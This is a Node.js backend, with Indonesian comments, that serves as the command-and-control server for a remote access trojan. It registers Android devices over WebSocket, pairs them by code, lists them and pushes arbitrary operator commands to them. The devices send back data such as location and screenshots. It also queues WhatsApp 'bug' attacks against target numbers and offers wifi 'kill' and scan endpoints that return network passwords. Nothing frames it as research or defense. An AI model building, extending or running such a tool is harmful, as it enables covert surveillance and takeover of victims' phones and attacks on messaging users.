// ============================================================
// LYX BACKEND — REAL SYSTEM v3.0
// ============================================================
const express = require('express');
const cors = require('cors');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================
// IN-MEMORY DATABASE (ganti ke MongoDB/PostgreSQL nanti)
// ============================================================
const db = {
  users: {},       // { username: { pass, role } }
  pairCodes: {},   // { code: { user, createdAt } }
  devices: {},     // { deviceId: { name, online, ws, lastSeen } }
  bugQueue: [],    // antrian bug WA
  wifiData: {}     // data wifi dari client
};

// ============================================================
// WEBSOCKET SERVER — buat real-time command ke APK client
// ============================================================
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
  console.log('[WS] Client connected');

  ws.on('message', (data) => {
    try {
      const msg = JSON.parse(data.toString());
      console.log('[WS] Message:', msg.type);

      // APK client register device
      if (msg.type === 'register_device') {
        const deviceId = msg.deviceId || 'dev_' + Date.now();
        db.devices[deviceId] = {
          id: deviceId,
          name: msg.deviceName || 'Unknown Device',
          model: msg.model || '',
          android: msg.android || '',
          online: true,
          ws: ws,
          lastSeen: Date.now()
        };
        ws.deviceId = deviceId;
        ws.send(JSON.stringify({
          type: 'registered',
          deviceId: deviceId,
          message: 'Device registered successfully'
        }));
        console.log('[WS] Device registered:', deviceId, msg.deviceName);
      }

      // APK client kirim hasil command
      if (msg.type === 'command_result') {
        console.log('[WS] Command result:', msg);
        // Forward ke dashboard kalau ada yang listen
      }

      // APK client kirim data (lokasi, screenshot, dll)
      if (msg.type === 'data') {
        console.log('[WS] Data from device:', msg.deviceId, msg.dataType);
      }

    } catch (e) {
      console.error('[WS] Error parsing message:', e.message);
    }
  });

  ws.on('close', () => {
    if (ws.deviceId && db.devices[ws.deviceId]) {
      db.devices[ws.deviceId].online = false;
      db.devices[ws.deviceId].ws = null;
      console.log('[WS] Device disconnected:', ws.deviceId);
    }
  });
});

// ============================================================
// HELPER: Kirim command ke device via WebSocket
// ============================================================
function sendCommandToDevice(deviceId, command, extra = {}) {
  const device = db.devices[deviceId];
  if (!device) return { success: false, message: 'Device tidak ditemukan' };
  if (!device.online || !device.ws) return { success: false, message: 'Device offline' };

  try {
    device.ws.send(JSON.stringify({
      type: 'command',
      command: command,
      ...extra,
      timestamp: Date.now()
    }));
    return { success: true, message: 'Command terkirim' };
  } catch (e) {
    return { success: false, message: 'Gagal kirim: ' + e.message };
  }
}

// ============================================================
// API ROUTES
// ============================================================

// --- STATUS ---
app.get('/api/status', (req, res) => {
  res.json({
    success: true,
    status: 'online',
    server: 'Lyx Backend v3.0',
    uptime: process.uptime(),
    devices: Object.keys(db.devices).length,
    timestamp: Date.now()
  });
});

// --- AUTH ---
app.post('/api/auth/register', (req, res) => {
  const { username, password, role } = req.body;
  if (!username || !password) {
    return res.json({ success: false, message: 'Username & password wajib' });
  }
  if (db.users[username]) {
    return res.json({ success: false, message: 'Username sudah ada' });
  }
  db.users[username] = { pass: password, role: role || 'MEMBER' };
  res.json({ success: true, message: 'Akun dibuat', user: { username, role } });
});

app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;
  const user = db.users[username];
  if (!user || user.pass !== password) {
    return res.json({ success: false, message: 'Username/password salah' });
  }
  res.json({ success: true, user: { username, role: user.role } });
});

// --- BUG WA ---
app.post('/api/bug/send', (req, res) => {
  const { target, bugType, intensity, sender, user } = req.body;
  if (!target) return res.json({ success: false, message: 'Target kosong' });

  const job = {
    id: 'bug_' + Date.now(),
    target, bugType, intensity, sender, user,
    status: 'queued',
    createdAt: Date.now()
  };
  db.bugQueue.push(job);

  console.log('[BUG] Queued:', job.id, '→', target);

  // Catatan: Implementasi Baileys nanti di sini
  // Untuk sekarang, return success (job masuk queue)
  res.json({
    success: true,
    message: 'Bug masuk antrian',
    jobId: job.id,
    queue: db.bugQueue.length
  });
});

app.get('/api/bug/queue', (req, res) => {
  res.json({ success: true, queue: db.bugQueue, total: db.bugQueue.length });
});

// --- WIFI ---
app.post('/api/wifi/kill', (req, res) => {
  const { ssid, deviceId } = req.body;
  if (!ssid) return res.json({ success: false, message: 'SSID kosong' });

  // Kalau ada deviceId, kirim command ke device
  if (deviceId) {
    const result = sendCommandToDevice(deviceId, 'kill_wifi', { ssid });
    return res.json(result);
  }

  // Kalau gak ada deviceId, cuma log
  console.log('[WIFI] Kill request for:', ssid);
  res.json({ success: true, message: 'Command kill wifi dikirim untuk: ' + ssid });
});

app.get('/api/wifi/scan', (req, res) => {
  const { deviceId } = req.query;

  // Kalau ada deviceId, minta device scan
  if (deviceId && db.devices[deviceId]) {
    const result = sendCommandToDevice(deviceId, 'scan_wifi');
    return res.json({
      success: result.success,
      message: result.message,
      networks: [] // Hasil bakal dikirim via WebSocket nanti
    });
  }

  // Fallback: kasih data dummy buat testing
  res.json({
    success: true,
    networks: [
      { ssid: 'Indihome-Test', password: 'test123', signal: 4 },
      { ssid: 'Warkop Kopi', password: 'kopi2024', signal: 3 }
    ]
  });
});

// --- RAT ---
app.post('/api/rat/generate-code', (req, res) => {
  const { code, user } = req.body;
  if (!code) return res.json({ success: false, message: 'Code kosong' });

  db.pairCodes[code] = {
    user: user || 'unknown',
    createdAt: Date.now()
  };

  console.log('[RAT] Code generated:', code);
  res.json({ success: true, message: 'Code pairing dibuat', code });
});

app.post('/api/rat/verify-code', (req, res) => {
  const { code, deviceId, deviceName, model, android } = req.body;
  if (!db.pairCodes[code]) {
    return res.json({ success: false, message: 'Code pairing tidak valid' });
  }

  const id = deviceId || 'dev_' + Date.now();
  db.devices[id] = {
    id: id,
    name: deviceName || 'Unknown Device',
    model: model || '',
    android: android || '',
    online: false,
    ws: null,
    lastSeen: Date.now()
  };

  console.log('[RAT] Device verified:', id, deviceName);
  res.json({ success: true, message: 'Device terdaftar', deviceId: id });
});

app.get('/api/rat/devices', (req, res) => {
  const list = Object.values(db.devices).map(d => ({
    id: d.id,
    name: d.name,
    model: d.model,
    android: d.android,
    online: d.online,
    lastSeen: d.lastSeen
  }));
  res.json({ success: true, devices: list, total: list.length });
});

app.post('/api/rat/command', (req, res) => {
  const { deviceId, command, ...extra } = req.body;
  if (!deviceId) return res.json({ success: false, message: 'Device ID kosong' });
  if (!command) return res.json({ success: false, message: 'Command kosong' });

  const result = sendCommandToDevice(deviceId, command, extra);
  console.log('[RAT] Command:', command, '→', deviceId, '→', result.success ? 'OK' : 'FAIL');
  res.json(result);
});

// --- OPTIMIZE ---
app.post('/api/optimize', (req, res) => {
  // Simulasi optimize — ganti dengan logic beneran nanti
  const before = process.memoryUsage().heapUsed;
  if (global.gc) global.gc();
  const after = process.memoryUsage().heapUsed;
  res.json({
    success: true,
    message: 'Optimasi selesai',
    memoryBefore: before,
    memoryAfter: after
  });
});

// ============================================================
// SERVE DASHBOARD
// ============================================================
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Fallback route
app.use((req, res) => {
  res.status(404).json({ success: false, message: 'Endpoint tidak ditemukan: ' + req.path });
});

// ============================================================
// START SERVER
// ============================================================
server.listen(PORT, '0.0.0.0', () => {
  console.log('========================================');
  console.log('  LYX BACKEND v3.0');
  console.log('  Server running on port ' + PORT);
  console.log('  WebSocket ready');
  console.log('  http://localhost:' + PORT);
  console.log('========================================');
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('[SERVER] Shutting down...');
  server.close(() => {
    console.log('[SERVER] Closed');
    process.exit(0);
  });
});